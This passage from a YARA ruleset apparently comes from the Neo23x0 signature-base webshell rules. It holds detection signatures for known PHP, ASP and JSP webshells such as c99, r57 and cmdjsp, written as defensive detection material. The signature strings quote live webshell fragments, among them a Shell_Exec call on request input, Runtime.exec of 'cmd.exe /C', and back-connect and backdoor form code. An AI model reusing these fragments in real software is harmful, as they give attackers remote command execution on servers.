		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "0d63ad03-4d1d-535f-8afe-3edaf1bf4010"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4834-L4848"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8bfa2eeb8a3ff6afc619258e39fded56"
		logic_hash = "23574299ee2bb33c3f71102adf71ac8f09b6f8ece5f798beacb9b2432d297ee7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "www.ironwarez.info"
		$s1 = "$cookiename = \"wieeeee\";"
		$s2 = "~ Shell I"
		$s3 = "www.rootshell-team.info"
		$s4 = "setcookie($cookiename, $_POST['pass'], time()+3600);"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Backdoorfr_Php {
    meta:
		description = "Semi-Auto-generated  - file backdoorfr.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "5ba2b617-a873-5e80-9cfc-c61cc8d605f3"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4849-L4860"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "91e4afc7444ed258640e85bcaf0fecfc"
		logic_hash = "40a6fb41a65fd35acb7cdc36fdda90f5dc54b641adc3ba9eaae29c5e46622206"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan"
		$s2 = "print(\"<br>Provenance du mail : <input type=\\\"text\\\" name=\\\"provenanc"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Aspydrv_Asp {
    meta:
		description = "Semi-Auto-generated  - file aspydrv.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4420d13e-7015-5083-ba08-b41bf28b00c2"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4861-L4874"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1c01f8a88baee39aa1cebec644bbcb99"
		logic_hash = "64912d7521d4bff33b5f3a78525bf4ed94246f5933753bed7ca02bedffc85f0f"
		score = 60
		quality = 85
		tags = ""

	strings:
		$s0 = "If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))"
		$s1 = "password"
		$s2 = "session(\"shagman\")="

	condition:
		2 of them
}
rule SIGNATURE_BASE_Cmdjsp_Jsp {
    meta:
		description = "Semi-Auto-generated  - file cmdjsp.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "048478a8-9622-54c7-80ed-e4e223d14500"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4875-L4888"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b815611cc39f17f05a73444d699341d4"
		logic_hash = "8b0e425c7d71ea2c536192ff186665e7f0fbdbc0e0d195d7107ac57cf9bd1773"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" " fullword
		$s1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
		$s2 = "cmdjsp.jsp"
		$s3 = "michaeldaw.org" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_H4Ntu_Shell__Powered_By_Tsoi_ {
    meta:
		description = "Semi-Auto-generated  - file h4ntu shell [powered by tsoi].txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "186358e6-88a3-5fad-b1ba-a49b2a5dea1c"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4889-L4900"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "06ed0b2398f8096f1bebf092d0526137"
		logic_hash = "32c620a4ed3f7a8640928e2211516978c12cfbdedb7d96e923303740407b5a1c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "h4ntu shell"
		$s1 = "system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Ajan_Asp {
    meta:
		description = "Semi-Auto-generated  - file Ajan.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6040fd88-b992-5110-8b37-7711ace30b1a"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4901-L4913"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b6f468252407efc2318639da22b08af0"
		logic_hash = "13988af864a62ca04501288d4f2d830815ab453b14cef6795fe993db1dd1a9ef"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "c:\\downloaded.zip"
		$s2 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)" fullword
		$s3 = "http://www35.websamba.com/cybervurgun/"

	condition:
		1 of them
}
rule SIGNATURE_BASE_PHANTASMA_Php {
    meta:
		description = "Semi-Auto-generated  - file PHANTASMA.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "21ff4cee-9cdc-57d1-9c43-e033fdb47de0"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4914-L4927"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "52779a27fa377ae404761a7ce76a5da7"
		logic_hash = "d4a2a1bcc1ff3264b35f2b05d7de664b56807977f2a793fd87206f046a185d3b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ">[*] Safemode Mode Run</DIV>"
		$s1 = "$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>"
		$s2 = "[*] Spawning Shell"
		$s3 = "Cha0s"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Mysql_Web_Interface_Version_0_8_Php {
    meta:
		description = "Semi-Auto-generated  - file MySQL Web Interface Version 0.8.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "90616d2d-082b-5983-a859-62d1c5b8066e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4928-L4941"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "36d4f34d0a22080f47bb1cb94107c60f"
		logic_hash = "f0a20870a3240948e3ef1ad61685b00c5fc90d6098b87af9ac43ab44ccd13c9e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "SooMin Kim"
		$s1 = "http://popeye.snu.ac.kr/~smkim/mysql"
		$s2 = "href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename"
		$s3 = "<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Simple_Cmd_Html {
    meta:
		description = "Semi-Auto-generated  - file simple_cmd.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "30990574-02a0-5eed-8317-847b6be13300"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4942-L4955"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c6381412df74dbf3bcd5a2b31522b544"
		logic_hash = "56b5b9e5518fa8a4be8c48735e997a538b0e534ad8fd72c1419dc0e8353bbc00"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "<title>G-Security Webshell</title>" fullword
		$s2 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
		$s3 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
		$s4 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE__1_C2007_Php_Php_C100_Php {
    meta:
		description = "Semi-Auto-generated  - from files 1.txt, c2007.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "00ada6a4-a32a-5184-867d-e10a8c95c41c"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4956-L4970"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "6f6cb7c210bcd0f84c2ccff52850b1d673622ae49b83d614d63b5bbba7392327"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash1 = "d089e7168373a0634e1ac18c0ee00085"
		hash2 = "38fd7e45f9c11a37463c3ded1c76af4c"

	strings:
		$s0 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\""
		$s3 = "echo \"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"

	condition:
		1 of them
}
rule SIGNATURE_BASE__Nst_Php_Php_Img_Php_Php_Nstview_Php_Php {
    meta:
		description = "Semi-Auto-generated  - from files nst.php.php.txt, img.php.php.txt, nstview.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "238242f5-4e57-5edb-8806-ea5e06f1f637"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4971-L4986"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "b1e13f75edbbc8f9263e0e516a54330ce57190ba0b45813dad4bafeaeefa389b"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
		hash1 = "17a07bb84e137b8aa60f87cd6bfab748"
		hash2 = "4745d510fed4378e4b1730f56f25e569"

	strings:
		$s0 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i"
		$s1 = "$perl_proxy_scp = \"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v"
		$s2 = "<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input"

	condition:
		1 of them
}
rule SIGNATURE_BASE__Network_Php_Php_Xinfo_Php_Php_Nfm_Php_Php {
    meta:
		description = "Semi-Auto-generated  - from files network.php.php.txt, xinfo.php.php.txt, nfm.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4fd11db6-902d-5f1a-96c5-9dfcccce7488"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4987-L5001"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "913ff19b6448d3b074440c2a5f85d85813fdf010d33dc57c89ba1e5db6455e11"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "acdbba993a5a4186fd864c5e4ea0ba4f"
		hash1 = "2601b6fc1579f263d2f3960ce775df70"
		hash2 = "401fbae5f10283051c39e640b77e4c26"

	strings:
		$s0 = ".textbox { background: White; border: 1px #000000 solid; color: #000099; font-fa"
		$s2 = "<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''"

	condition:
		all of them
}
rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_Specialshell_99_Php_Php {
    meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ee1fd555-f1bc-59a5-998c-f6098de8623e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5002-L5017"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "a4bae5456baf0d8d894165c84d66118f2b16cfc040e299c2032eccb6a9eb4822"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s2 = "echo \"<hr size=\\\"1\\\" noshade><b>Done!</b><br>Total time (secs.): \".$ft"
		$s3 = "$fqb_log .= \"\\r\\n------------------------------------------\\r\\nDone!\\r"

	condition:
		1 of them
}
rule SIGNATURE_BASE__R577_Php_Php_Sniper_SA_Shell_Php_R57_Php_Php_R57_Shell_Php_Php_Spy_Php_Php_S_Php_Php {
    meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44b53124-c8b6-545b-819f-77fd65e5d61b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5018-L5035"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "0df3e00f752f85aa1f150c01e3ef41b9a5cd3d3ce2060965992320cb3c4d87ae"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash3 = "8023394542cddf8aee5dec6072ed02b5"
		hash4 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash5 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner o"
		$s4 = "if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult"

	condition:
		1 of them
}
rule SIGNATURE_BASE__C99Shell_V1_0_Php_Php_C99Php_Sses_Php_Php_Ctt_Sh_Php_Php {
    meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, ctt_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5036-L5052"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "137f98b636ec012d7d5e687f7d24ae88e8d3261360e60a4bbc03da248cce381e"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash3 = "671cad517edd254352fe7e0c7c981c39"

	strings:
		$s0 = "\"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze\""
		$s2 = "\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\""
		$s4 = "\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\""

	condition:
		2 of them
}
rule SIGNATURE_BASE__R577_Php_Php_Spy_Php_Php_S_Php_Php {
    meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d287136c-534b-51a4-88fc-40ef9f22d910"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5053-L5067"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "09892789e8dad16f9fc7c4e22525e5d0af3af401a4b2655b70f7a6856888875c"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash2 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s2 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['"
		$s3 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db>"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_C99_Generic {
    meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5068-L5088"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "422bc3a0d9b04b1e37ad954faacb1ec7841fe529c1eb19634bdbfe83da374c73"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "09609851caa129e40b0d56e90dfc476c"
		hash6 = "671cad517edd254352fe7e0c7c981c39"

	strings:
		$s0 = "  if ($copy_unset) {foreach($sess_data[\"copy\"] as $k=>$v) {unset($sess_data[\""
		$s1 = "  if (file_exists($mkfile)) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile"
		$s2 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_pr"
		$s3 = "  elseif (!fopen($mkfile,\"w\")) {echo \"<b>Make File \\\"\".htmlspecialchars($m"

	condition:
		all of them
}
rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_C99Shell_V1_0_Php_Php_C99Php_Specialshell_99_Php_Php {
    meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5089-L5106"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "b133cf947476a1c94ed90b5cd3757ca8aa429be4284d75664625896d9cfa687f"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "$sess_data[\"cut\"] = array(); c99_s"
		$s3 = "if ((!eregi(\"http://\",$uploadurl)) and (!eregi(\"https://\",$uploadurl))"

	condition:
		1 of them
}
rule SIGNATURE_BASE__W_Php_Php_Wacking_Php_Php_Specialshell_99_Php_Php {
    meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "c01ad0e5-1aff-5128-9d0c-5d0967532a4b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5107-L5121"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "7bdaebfb093b58a2fd33b4bbeea8465d0f724383b4855eb521a3e339ee153781"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "\"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
		$s2 = "c99sh_sqlquery"

	condition:
		1 of them
}
rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_Sses_Php_Php_Specialshell_99_Php_Php {
    meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ee1fd555-f1bc-59a5-998c-f6098de8623e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5122-L5138"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "6dbd40e19d4d5753dbd1f7e627bccc08a60430de8138a923f13e836d19dde65c"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "else {$act = \"f\"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPA"
		$s3 = "else {echo \"<b>File \\\"\".$sql_getfile.\"\\\":</b><br>\".nl2br(htmlspec"

	condition:
		1 of them
}
rule SIGNATURE_BASE__R577_Php_Php_Sniper_SA_Shell_Php_R57_Php_Php_Spy_Php_Php_S_Php_Php {
    meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44b53124-c8b6-545b-819f-77fd65e5d61b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5139-L5155"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "834c33059e08e8075a8d3f69187b74f3b53afabfc37ae1f13a2f579f0948a363"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash4 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s0 = "echo sr(15,\"<b>\".$lang[$language.'_text"
		$s1 = ".$arrow.\"</b>\",in('text','"

	condition:
		2 of them
}
rule SIGNATURE_BASE__R577_Php_Php_Sniper_SA_Shell_Php_R57_Php_Php {
    meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44b53124-c8b6-545b-819f-77fd65e5d61b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5156-L5171"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "f97846fdaac949185b4ce6a25cc276f4ae4243d891acb18c3a3ce0c18b540976"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"

	strings:
		$s0 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword
		$s1 = "$name='ec371748dc2da624b35a4f8f685dd122'"
		$s2 = "rst.void.ru"

	condition:
		3 of them
}
rule SIGNATURE_BASE__R577_Php_Php_R57_Shell_Php_Php_Spy_Php_Php_S_Php_Php {
    meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "7a31b923-15e5-5af4-9ad0-8d261fedf7c4"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5172-L5188"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "764a374c1e4acec8978db1e7e7e326c4fa95c6f92e1ca5a6d7f892bb05ecd289"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "8023394542cddf8aee5dec6072ed02b5"
		hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash3 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s0 = "echo ws(2).$lb.\" <a"
		$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']"
		$s3 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"l"

	condition:
		2 of them
}
rule SIGNATURE_BASE__Wacking_Php_Php_1_Specialshell_99_Php_Php_C100_Php {
    meta:
		description = "Semi-Auto-generated  - from files wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "3dac5550-598a-5a0f-95c3-2e0162a686ee"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5189-L5205"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
